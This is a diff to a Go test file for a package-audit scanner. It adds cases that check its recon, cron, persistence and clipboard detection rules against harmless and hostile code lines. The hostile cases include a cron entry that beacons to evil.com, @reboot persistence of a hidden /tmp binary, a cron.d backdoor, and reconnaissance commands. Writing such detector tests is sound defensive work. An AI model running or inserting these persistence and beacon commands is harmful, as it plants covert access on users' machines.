@@ -118,3 +118,43 @@ func TestAuditBackgroundingNeedsARealAmpersand(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Recon, cron and clipboard rules fired on tool names, prose, dependency lists and writes.
+func TestAuditReconCronClipboardNeedTheCommand(t *testing.T) {
+	neg := []ruleCase{
+		{"P-SYSINFO-RECON", "aur", `depends=('btrfs-progs' 'parted' 'libnewt' 'dosfstools' 'jq' 'util-linux' 'dmidecode' 'zstd' 'xz' 'aria2')`},
+		{"P-SYSINFO-RECON", "cargo", `ip addr add 10.99.99.1/24 dev dummy0 2>/dev/null || true`},
+		{"P-SYSINFO-RECON", "go", `err: errors.New("ip addr wasn't found"),`},
+		{"P-SYSINFO-RECON", "packagist", `$this->assertEquals($this->ipAddress, $sentinel->getIpAddress(), 'A sentinel location is identified by ip address');`},
+		{"P-SYSINFO-RECON", "pypi", `self.log.warning("Cannot run 'hostname -I' on localhost: %s", e)`},
+		{"P-SYSINFO-RECON", "pypi", `if [ -z "$gpu" ] && command -v lspci >/dev/null 2>&1; then`},
+		{"P-SYSINFO-RECON", "pypi", `out = subprocess.check_output(["adb", "shell", "uname -a"])`},
+		{"P-CRON-CREATE", "go", `func CreateBackupJob(config BackupConfig, crontab string) {`},
+		{"P-CRON-CREATE", "go", `github.com/mileusna/crontab v1.2.0`},
+		{"P-CRON-CREATE", "go", `"crontab", "at", "systemd-analyze",`},
+		{"P-CRON-CREATE", "cargo", `assert_eq!(sanitize_filename("../../../etc/cron.d/x"), "x");`},
+		{"P-CRON-CREATE", "packagist", `'default' => '/etc/cron.d/froxlor',`},
+		{"P-INSTALL-PERSISTENCE", "hex", `{:crontab, "~> 1.1"},`},
+		{"P-CLIPBOARD-READ", "npm", `execSync("xclip -selection clipboard", options);`},
+		{"P-CLIPBOARD-READ", "rubygems", `else [ %w[wl-copy], %w[xclip -selection clipboard], %w[xsel --clipboard --input] ].find { system("which", _1.first) }`},
+		{"P-CLIPBOARD-READ", "pypi", `raise DesktopControlError("No clipboard backend found. Install xclip on Linux/X11.")`},
+	}
+	pos := []ruleCase{
+		{"P-SYSINFO-RECON", "npm", `$command = self::isWin() ? 'wmic cpu get ProcessorID' : 'dmidecode -t processor | grep ID';`},
+		{"P-SYSINFO-RECON", "npm", `'gpu_model': "lspci 2>/dev/null | grep -i 'vga' | head -1",`},
+		{"P-SYSINFO-RECON", "npm", `r'uname -a; w; id; /bin/bash -i',`},
+		{"P-SYSINFO-RECON", "npm", `$output = shell_exec('ip addr show');`},
+		{"P-SYSINFO-RECON", "npm", `exec := "ip addr"`},
+		{"P-CRON-CREATE", "npm", `(crontab -l; echo "* * * * * curl evil.com/beacon") | crontab -`},
+		{"P-CRON-CREATE", "npm", `cmd := exec.Command("sh", "-c", "crontab -r 2>/dev/null")`},
+		{"P-CRON-CREATE", "npm", `info("write_file('/etc/cron.d/backdoor', '...')")`},
+		{"P-CRON-CREATE", "npm", `echo "* * * * * root /tmp/.x" >> /etc/crontab`},
+		{"P-CRON-CREATE", "npm", `subprocess.run(["crontab", tmp.name])`},
+		{"P-INSTALL-PERSISTENCE", "npm", `(crontab -l 2>/dev/null; echo "@reboot /tmp/.x") | crontab -`},
+		{"P-CLIPBOARD-READ", "npm", `return execSync('xclip -selection clipboard -o', {`},
+		{"P-CLIPBOARD-READ", "npm", `primary = ` + "`xsel -p`"},
+		{"P-CLIPBOARD-READ", "npm", `Jo("pbpaste",{encoding:"utf8"})`},
+		{"P-CLIPBOARD-READ", "npm", `'wl-paste --no-newline 2>/dev/null || xsel --clipboard --output 2>/dev/null',`},
+	}
+	checkRuleCases(t, neg, pos)
+}
